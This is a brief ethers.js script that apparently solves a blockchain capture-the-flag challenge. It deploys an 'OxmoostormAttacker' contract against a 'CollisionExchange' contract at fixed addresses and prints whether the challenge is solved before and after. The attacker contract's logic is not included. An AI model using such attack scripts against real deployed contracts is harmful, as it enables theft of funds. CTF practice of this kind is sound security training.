const { parseEther } = require("ethers/lib/utils");

async function main() {
  const EXPLOIT = await ethers.getContractFactory("OxmoostormAttacker");

  const setup = await ethers.getContractAt( "Setup", "0x5e40D0d98126323b81246008d386a93BA091704f" );
  const ctf = await ethers.getContractAt( "CollisionExchange", "0xE442a00a4587677c945598e19DF41822e851c1DE" );

  console.log("solved:", await setup.isSolved());

  await EXPLOIT.deploy(ctf.address);

  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
